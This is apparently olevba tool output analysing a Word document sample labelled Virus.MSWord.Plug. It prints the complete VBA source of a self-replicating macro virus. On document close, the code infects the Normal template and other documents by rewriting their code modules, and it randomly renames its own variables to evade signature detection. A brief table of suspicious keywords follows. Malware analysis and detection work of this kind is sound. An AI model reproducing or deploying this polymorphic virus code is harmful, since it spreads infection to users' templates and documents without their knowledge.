olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plug-1d512f628f26e8bc0f9cc6e43130c11ab0a71c9a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plug-1d512f628f26e8bc0f9cc6e43130c11ab0a71c9a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Pluginer
Private Sub Document_Close()
'1
 On Error Resume Next
 label_ = "'Pluginer"
 Set NT_ = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD_ = ActiveDocument.VBProject.VBComponents(1).CodeModule
 Set cntnr_ = MacroContainer
 If NT_.lines(1, 1) = label_ And AD_.lines(1, 1) = label_ Then
   If cntnr_.Name = NormalTemplate Then
     Call CheckSubs(NT_, AD_)
    Else
     Call CheckSubs(AD_, NT_)
   End If
  Else
   If NT_.lines(1, 1) = label_ Then
     AD_.DeleteLines 1, AD_.countoflines
     Mutate_ = mutate(NT_.lines(1, NT_.countoflines))
     AD_.insertLines 1, Mutate_
    Else
     NT_.DeleteLines 1, NT_.countoflines
     Mutate_ = mutate(AD_.lines(1, AD_.countoflines))
     NT_.insertLines 1, Mutate_
   End If
 End If
End Sub
Private Sub CheckSubs(source_, dest_)
'1
 On Error Resume Next
 Dim NTnames_(255), ADnames_(255), NTStart_(255), ADStart_(255), NTLen_(255), ADLen_(255), NTver_(255), ADver_(255)
 ADi_ = 1: NTi_ = 1: NTCount_ = 0: ADCount_ = 0
 Do
  GetSub_ = GetSubName(dest_, NTi_, SubSt_, LenSt_, ver_)
  GetSub1_ = GetSubName(source_, ADi_, SubSt1_, LenSt1_, ver1_)
  If GetSub_ <> "" Then
   NTCount_ = NTCount_ + 1: NTnames_(NTCount_) = GetSub_: NTStart_(NTCount_) = SubSt_
   NTLen_(NTCount_) = LenSt_: NTver_(NTCount_) = ver_
  End If
  If GetSub1_ <> "" Then
   ADCount_ = ADCount_ + 1: ADnames_(ADCount_) = GetSub1_: ADStart_(ADCount_) = SubSt1_
   ADLen_(ADCount_) = LenSt1_: ADver_(ADCount_) = ver1_
  End If
 Loop While GetSub_ <> "" Or GetSub1_ <> ""
 For i_ = 1 To ADCount_
  fl_ = 0
  For j_ = 1 To NTCount_
   If NTnames_(j_) = ADnames_(i_) Then
    fl_ = 1
    If NTver_(j_) < ADver_(i_) Then
     dest_.DeleteLines NTStart_(j_), NTLen_(j_)
     dest_.insertLines 2, source_.lines(ADStart_(i_), ADLen_(i_))
    End If
   End If
  Next
  If fl_ = 0 Then dest_.insertLines 2, source_.lines(ADStart_(i_), ADLen_(i_))
 Next
End Sub
Private Function GetSubName(dest_, NTi_, SubSt_, LenSt_, ver_)
'1
 On Error Resume Next
 fl_ = 0: SubSt_ = 0: LenSt_ = 0: sName_ = "": ver_ = 0
 Do
  a_ = dest_.lines(NTi_, 1): i_ = 1
  Do
   If i_ <= Len(a_) - 6 Then
    If UCase(Mid(a_, i_, 5)) = " SUB" + " " And (i_ + 5) < Len(a_) Then
     fl_ = 1: i_ = i_ + 4
    End If
    If UCase(Right(a_, 5)) = "D SU" + "B" Then fl_ = 4: LenSt_ = NTi_ - SubSt_ + 1
   End If
   If i_ <= Len(a_) - 10 Then
    If UCase(Mid(a_, i_, 10)) = " FUNCTION" + " " And (i_ + 9) < Len(a_) Then
     fl_ = 1: i_ = i_ + 9
    End If
    If UCase(Right(a_, 10)) = "D FUNCTIO" + "N" Then fl_ = 4: LenSt_ = NTi_ - SubSt_ + 1
   End If
   If fl_ = 2 Then
    sName_ = sName_ + Mid(a_, i_, 1)
    If UCase(Mid(a_, i_ + 1, 1)) >= "A" And UCase(Mid(a_, i_ + 1, 1)) <= "Z" Then
      fl_ = 2
     Else
      If Mid(a_, i_ + 1, 1) >= "0" And Mid(a_, i_ + 1, 1) <= "9" Then fl_ = 2 Else fl_ = 3
    End If
   End If
   If fl_ = 1 Then SubSt_ = NTi_: fl_ = 2: ver_ = Val(Right(dest_.lines(SubSt_ + 1, 1), Len(dest_.lines(SubSt_ + 1, 1)) - 1))
   i_ = i_ + 1
  Loop While i_ <= Len(a_)
  If NTi_ > dest_.countoflines Then fl_ = 4
  NTi_ = NTi_ + 1
 Loop While fl_ <> 4
 GetSubName = sName_
End Function
Private Function mutate(MutVar_)
'1
 On Error Resume Next
 Dim oldVar_(500), newVar_(500)
 oldCounter_ = 0: i_ = 1
 Do While i_ <= Len(MutVar_)
  If Mid(MutVar_, i_, 1) = Chr(95) Then
   fl_ = CheckUp(Mid(MutVar_, i_ + 1, 1))
   If fl_ = 3 Then
    j_ = i_ - 1: myVar_ = ""
    Do
     myVar_ = Mid(MutVar_, j_, 1) + myVar_
     j_ = j_ - 1
     fl1_ = CheckUp(Mid(MutVar_, j_, 1))
    Loop While fl1_ = 2
    fl1_ = 0
    For i1_ = 1 To oldCounter_
     If oldVar_(i1_) = myVar_ Then fl1_ = 1
    Next
    If fl1_ = 0 Then
     oldCounter_ = oldCounter_ + 1: oldVar_(oldCounter_) = myVar_
     fl2_ = 0
     Do
      myVar_ = GetNR()
      For i1_ = 1 To oldCounter_
       If myVar_ = newVar_(i1_) Then fl2_ = 1
      Next
     Loop While fl2_ <> 0
     newVar_(oldCounter_) = myVar_
    End If
   End If
  End If
  i_ = i_ + 1
 Loop
 NewMutate_ = "": i_ = 1
 Do While i_ <= Len(MutVar_)
  If Mid(MutVar_, i_, 1) = Chr(95) Then
   fl_ = CheckUp(Mid(MutVar_, i_ + 1, 1))
   If fl_ = 3 Then
    j_ = i_ - 1: myVar_ = ""
    Do
     myVar_ = Mid(MutVar_, j_, 1) + myVar_
     j_ = j_ - 1
     fl1_ = CheckUp(Mid(MutVar_, j_, 1))
    Loop While fl1_ = 2
    For i1_ = 1 To oldCounter_
     If oldVar_(i1_) = myVar_ Then fl1_ = i1_
    Next
    j_ = Len(NewMutate_)
    Do While CheckUp(Mid(NewMutate_, j_, 1)) = 2
     j_ = j_ - 1
    Loop
    NewMutate_ = Left(NewMutate_, j_) + newVar_(fl1_)
   End If
  End If
  NewMutate_ = NewMutate_ + Mid(MutVar_, i_, 1)
  i_ = i_ + 1
 Loop
 mutate = NewMutate_
End Function
Private Function CheckUp(a_)
'1
 On Error Resume Next
 If UCase(Mid(a_, i_ + 1, 1)) >= "A" And UCase(Mid(a_, i_ + 1, 1)) <= "Z" Then
   fl_ = 2
  Else
   If Mid(a_, i_ + 1, 1) >= "0" And Mid(a_, i_ + 1, 1) <= "9" Then fl_ = 2 Else fl_ = 3
 End If
 CheckUp = fl_
End Function
Private Function GetNR()
'1
On Error Resume Next
 b_ = ""
 For i_ = 1 To Int(Rnd * 7) + 2
  b_ = b_ + Chr(97 + Int(Rnd * 26))
 Next
 GetNR = b_
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

